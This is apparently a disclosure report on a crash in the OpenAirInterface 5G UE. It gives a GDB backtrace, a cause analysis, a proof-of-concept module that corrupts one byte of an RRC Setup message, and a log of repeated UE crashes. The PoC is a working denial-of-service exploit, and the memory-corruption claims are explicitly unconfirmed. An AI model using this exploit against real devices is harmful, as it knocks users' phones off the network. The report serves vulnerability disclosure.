# mac_sch_16__BWP_Downlink_bwp_Common_reencoded_63_report
**Vulnerability Source Code**
https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/openair2/LAYER2/NR_MAC_COMMON/nr_mac_common.c#L3722

```
AssertFatal(l_prime>=0,"ERROR in configuration.Check Time Domain allocation of this Grant. l_prime < 1. row:%d, column:%d\n", row, column);
```

**Crash Context**  

In the 5G connection, the base station (sender) communicates with the user equipment (receiver), where the crash occurred on the user equipment. This crash took place during the RRC connection setup phase after the base station sent a tampered data packet. The backtrace reveals a `SIGABRT` error signal in the UEthread, with the primary function implicated being `fill_dmrs_mask` in the nr_mac_common.c file at line 3722

**1. Cause of Crash**
   - The function `fill_dmrs_mask` receives parameters such as `pdsch_Config`, `dmrs_TypeA_Position`, `NrOfSymbols`, `startSymbol`, `mappingtype`, and `length`. These parameters directly influence the configuration of the `DMRS` (Demodulation Reference Signal) mask, a critical component in handling downlink data. A malformed packet or invalid parameter values can lead to unexpected behavior in `fill_dmrs_mask`, potentially due to:
     - Out-of-range values or type mismatches.
     - Null or uninitialized pointers (e.g., `pdsch_Config`).
     - Unexpected values that violate assumptions in `nr_ue_process_dci` and related functions, triggering a `SIGABRT`.

**2. Vulnerability Potential**
   - **Memory Corruption**: The `fill_dmrs_mask` function could be susceptible to memory corruption if it does not handle out-of-bounds values properly. 
   - **Denial of Service (DoS)**: An attacker who can send malformed or unexpected data in RRC messages may repeatedly trigger this crash, causing the UE to repeatedly abort, thus leading to a Denial of Service (DoS).

**3. Exploitation Scenarios**
   - **Remote Trigger**: By crafting an RRC message with specific, malformed configurations (e.g., manipulating `NrOfSymbols`, `startSymbol`), an attacker could potentially cause memory corruption or crashes in UEs connected to a compromised gNB.
   - **Persistent UE Crash Loop**: If the vulnerability is exploited in an environment where the UE continually attempts reconnections, a persistent crash loop could occur, effectively rendering the UE unusable.

**Summary for CVE Submission**
The vulnerability appears to be triggered by malformed parameters in RRC messages, resulting in an unhandled exception in `fill_dmrs_mask`. This may be exploited to cause denial of service by repeated crashes or, potentially, memory corruption if further validation gaps are discovered. Additional research is needed to confirm exploitation potential, but this crash highlights a flaw in handling tampered packet inputs in RRC setup, affecting the UE’s stability and security.

**GDB Debug Information**
```console
Thread 13 "UEthread" received signal SIGABRT, Aborted.
[Switching to Thread 0x7a2574e00700 (LWP 42174)]
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
51	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) bt
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
#1  0x00007a25857837f1 in __GI_abort () at abort.c:79
#2  0x00005e2e7c80fea0 in fill_dmrs_mask (pdsch_Config=0x1, dmrs_TypeA_Position=<optimized out>, NrOfSymbols=1, startSymbol=1, mappingtype=<optimized out>, length=1) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_COMMON/nr_mac_common.c:3722
#3  0x00005e2e7c927c83 in nr_ue_process_dci (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=<optimized out>, slot=<optimized out>, dci=0x5e2e86471f20, dci_ind=0x7a2574d932b0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c:1308
#4  0x00005e2e7c92b360 in nr_ue_process_dci_indication_pdu (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=193, slot=14, dci=0x7a2574d932b0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c:629
#5  0x00005e2e7c915cd8 in handle_dci (module_id=<optimized out>, cc_id=<optimized out>, gNB_index=<optimized out>, frame=<optimized out>, slot=<optimized out>, dci=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1068
#6  0x00005e2e7c9161e2 in nr_ue_dl_indication (dl_info=0x7a2574d93230, ul_time_alignment=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c:1168
#7  0x00005e2e7c830a1b in nr_ue_pdcch_procedures (ue=0x7a25879c9010, proc=<optimized out>, pdcch_est_size=<optimized out>, pdcch_dl_ch_estimates=<optimized out>, phy_data=<optimized out>, n_ss=<optimized out>, rxdataF=0x7a2574de79e0) at /home/user/wdissector/3rd-party/oai_5g_sa/openair1/SCHED_NR_UE/phy_procedures_nr_ue.c:542
#8  0x00005e2e7c835d1d in phy_procedures_nrUE_RX (ue=0x7a25879c9010, proc=<optimized out>, phy_data=<optimized out>) at /home/user/wdissector/3rd-party/oai_5g_sa/openair1/SCHED_NR_UE/phy_procedures_nr_ue.c:1212
#9  0x00005e2e7c7ff128 in UE_processing (rxtxD=0x7a2574dff8b0) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:622
#10 0x00005e2e7c800441 in UE_thread (arg=0x7a25879c9010) at /home/user/wdissector/3rd-party/oai_5g_sa/executables/nr-ue.c:911
#11 0x00007a258730e6db in start_thread (arg=0x7a2574e00700) at pthread_create.c:463
#12 0x00007a258586461f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
(gdb) 

```

**Malformed Packet Send From the Base Station**
![Malformed Packet](https://github.com/qiqingh/mac_sch_16__BWP_Downlink_bwp_Common_reencoded_63_report/blob/main/pcap.png)


**PoC Code**


The following PoC code generates a falsified packet sent from the Base Station (sender) to the User Equipment (receiver). Due to a vulnerability in the User Equipment, this packet causes the device to crash, resulting in a Denial of Service (DoS).

To compile and run this PoC code, you'll need the environment described here: https://github.com/asset-group/5ghoul-5g-nr-attacks?tab=readme-ov-file#4--create-your-own-5g-exploits-test-cases

```cpp
#include <ModulesInclude.hpp>

// Filters
wd_filter_t f1;

// Vars

const char *module_name()
{
    return "Mediatek";
}

// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;

    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);

    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[146 - 48] = 0x80;
        return 1;
    }

    return 0;
}

```

**Crash Event Log**

```console
[2024-10-11 02:24:31.613373] [Open5GS] Subscribers registered to core network: 14
[2024-10-11 02:24:31.995643] [!] Simulation Enabled, disabling ModemManager and HubCtrl. Remember to enabled them later!
[2024-10-11 02:24:32.995040] Starting OAI UE Simulator (RFSIM)
[2024-10-11 02:24:33.027550] [!] UE process started
[2024-10-11 02:24:33.027615] [GlobalTimeout] Not enabled in config. file
[2024-10-11 02:24:33.027630] [AnomalyReport] Added Logging Sink: PacketLogger
[2024-10-11 02:24:33.027641] [AnomalyReport] Added Logging Sink: SvcReportSender
[2024-10-11 02:24:33.027652] [USBHubControl] Disabled in config. file
[2024-10-11 02:24:33.027663] [ModemManager] ModemManager not started!
[2024-10-11 02:24:33.027674] [ReportSender] Credentials file not found: modules/reportsender/credentials.json
[2024-10-11 02:24:33.027684] [ReportSender] Ready
[2024-10-11 02:24:33.027697] [Optimizer] Optimization disabled. Using default population:
[2024-10-11 02:24:33.027708] --------------------------------------------------------
[2024-10-11 02:24:33.027719] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:33.027730] [Optimizer] Fitness=1e+06  Adj. Fitness=-1e+06
[2024-10-11 02:24:33.027741] --------------------------------------------------------
[2024-10-11 02:24:33.027751] [Optimizer] Initialized with X Size=293, Population Size=5
[2024-10-11 02:24:33.027762] [Main] Fuzzing not enabled! Running only target reconnection
[2024-10-11 02:24:33.037835] [PacketHandler] Added "proto:nas-5gs", Dir:0, Realtime:0, TID:1432074
[2024-10-11 02:24:33.037882] [PacketHandler] Added "proto:nas-5gs", Dir:1, Realtime:0, TID:1432076
[2024-10-11 02:24:33.037892] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:0, Realtime:1, TID:1432077
[2024-10-11 02:24:33.037902] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:1, Realtime:1, TID:1432078
[2024-10-11 02:24:33.037913] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:1432079
[2024-10-11 02:24:33.037922] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:1432080
[2024-10-11 02:24:33.059319] [PacketHandler] Added "proto:mac-nr-framed", Dir:1, Realtime:0, TID:1432082
[2024-10-11 02:24:33.596482] [Main] eNB/gNB started!
[2024-10-11 02:24:33.596536] [!] Waiting UE task to start...
[2024-10-11 02:24:36.264577] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:36.264660] --------------------------------------------------------
[2024-10-11 02:24:36.264678] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:36.264693] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:36.264706] --------------------------------------------------------
[2024-10-11 02:24:36.264719] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:36.360330] [!] UE process stopped
[2024-10-11 02:24:36.360581] [!] UE process crashed
[2024-10-11 02:24:36.360592] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:36.360598] [PacketLogger] Packet Number:8, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:36.370695] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:36.381450] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:36.401652] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:36.462089] [!] UE process started
[2024-10-11 02:24:36.540802] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:37.265713] [UE] Restarting connection...
[2024-10-11 02:24:37.265770] [!] UE process stopped
[2024-10-11 02:24:37.416765] [!] UE process started
[2024-10-11 02:24:40.645284] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:40.648099] --------------------------------------------------------
[2024-10-11 02:24:40.648130] [Optimizer] Iter=2  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:40.648136] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:40.648141] --------------------------------------------------------
[2024-10-11 02:24:40.658231] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:40.748806] [!] UE process stopped
[2024-10-11 02:24:40.751737] [!] UE process crashed
[2024-10-11 02:24:40.751746] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:40.751752] [PacketLogger] Packet Number:22, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:40.761813] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:40.771914] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:40.792092] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:40.852474] [!] UE process started
[2024-10-11 02:24:40.930945] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:41.645774] [UE] Restarting connection...
[2024-10-11 02:24:41.645863] [!] UE process stopped
[2024-10-11 02:24:41.807143] [!] UE process started
[2024-10-11 02:24:45.033764] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:45.036513] --------------------------------------------------------
[2024-10-11 02:24:45.036537] [Optimizer] Iter=3  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:45.036550] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:45.036566] --------------------------------------------------------
[2024-10-11 02:24:45.036579] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:45.117127] [!] UE process stopped
[2024-10-11 02:24:45.125596] [!] UE process crashed
[2024-10-11 02:24:45.125652] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:45.125673] [PacketLogger] Packet Number:36, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:45.135750] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:45.145861] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:45.166027] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:45.226405] [!] UE process started
[2024-10-11 02:24:45.305148] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:46.030049] [UE] Restarting connection...
[2024-10-11 02:24:46.030111] [!] UE process stopped
[2024-10-11 02:24:46.192675] [!] UE process started
[2024-10-11 02:24:49.424775] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:49.427615] --------------------------------------------------------
[2024-10-11 02:24:49.427655] [Optimizer] Iter=4  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:49.427669] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:49.427682] --------------------------------------------------------
[2024-10-11 02:24:49.427695] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:49.518681] [!] UE process stopped
[2024-10-11 02:24:49.518829] [!] UE process crashed
[2024-10-11 02:24:49.518841] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:49.518848] [PacketLogger] Packet Number:50, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:49.528925] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:49.539571] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:49.560573] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:49.621003] [!] UE process started
[2024-10-11 02:24:49.698463] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:50.423187] [UE] Restarting connection...
[2024-10-11 02:24:50.423252] [!] UE process stopped
[2024-10-11 02:24:50.585289] [!] UE process started
[2024-10-11 02:24:53.786668] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:53.796928] --------------------------------------------------------
[2024-10-11 02:24:53.796988] [Optimizer] Iter=5  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:53.797001] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:53.797012] --------------------------------------------------------
[2024-10-11 02:24:53.797024] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:53.883834] [!] UE process stopped
[2024-10-11 02:24:53.883966] [!] UE process crashed
[2024-10-11 02:24:53.883989] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:53.884009] [PacketLogger] Packet Number:64, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:53.894089] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:53.904235] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:53.924429] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:53.984831] [!] UE process started
[2024-10-11 02:24:54.073576] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:54.788715] [UE] Restarting connection...
[2024-10-11 02:24:54.788761] [!] UE process stopped
[2024-10-11 02:24:54.949913] [!] UE process started
[2024-10-11 02:24:58.184809] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:24:58.195017] --------------------------------------------------------
[2024-10-11 02:24:58.195059] [Optimizer] Iter=6  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:24:58.195064] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:24:58.195068] --------------------------------------------------------
[2024-10-11 02:24:58.195072] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:24:58.281087] [!] UE process stopped
[2024-10-11 02:24:58.281192] [!] UE process crashed
[2024-10-11 02:24:58.281201] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:58.281207] [PacketLogger] Packet Number:78, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:24:58.291292] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:58.301823] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:58.322064] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:24:58.382542] [!] UE process started
[2024-10-11 02:24:58.460722] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:24:59.186184] [UE] Restarting connection...
[2024-10-11 02:24:59.186262] [!] UE process stopped
[2024-10-11 02:24:59.347382] [!] UE process started
[2024-10-11 02:25:02.595932] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:25:02.598720] --------------------------------------------------------
[2024-10-11 02:25:02.598769] [Optimizer] Iter=7  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:25:02.598780] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:25:02.598790] --------------------------------------------------------
[2024-10-11 02:25:02.608860] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:25:02.699586] [!] UE process stopped
[2024-10-11 02:25:02.699716] [!] UE process crashed
[2024-10-11 02:25:02.699725] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:25:02.699736] [PacketLogger] Packet Number:92, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:25:02.699740] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:02.719864] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:02.740031] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:02.807080] [!] UE process started
[2024-10-11 02:25:02.877658] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:25:03.602677] [UE] Restarting connection...
[2024-10-11 02:25:03.602739] [!] UE process stopped
[2024-10-11 02:25:03.757298] [!] UE process started
[2024-10-11 02:25:06.950152] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-11 02:25:06.952956] --------------------------------------------------------
[2024-10-11 02:25:06.953010] [Optimizer] Iter=8  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-11 02:25:06.953060] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-11 02:25:06.953088] --------------------------------------------------------
[2024-10-11 02:25:06.953122] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-11 02:25:07.043657] [!] UE process stopped
[2024-10-11 02:25:07.046507] [!] UE process crashed
[2024-10-11 02:25:07.046514] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:25:07.046522] [PacketLogger] Packet Number:106, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-11 02:25:07.056613] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:07.066728] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:07.086881] [M] TX --> RRC Setup[UNKNOWN PER: 10.9 Unconstrained]  (Padding 62 bytes) 
[2024-10-11 02:25:07.157488] [!] UE process started
[2024-10-11 02:25:07.217954] [AlertSender:Gmail] Creating token.json
[2024-10-11 02:25:07.953037] [UE] Restarting connection...
[2024-10-11 02:25:07.953083] [!] UE process stopped
[2024-10-11 02:25:08.108448] [!] UE process started
```
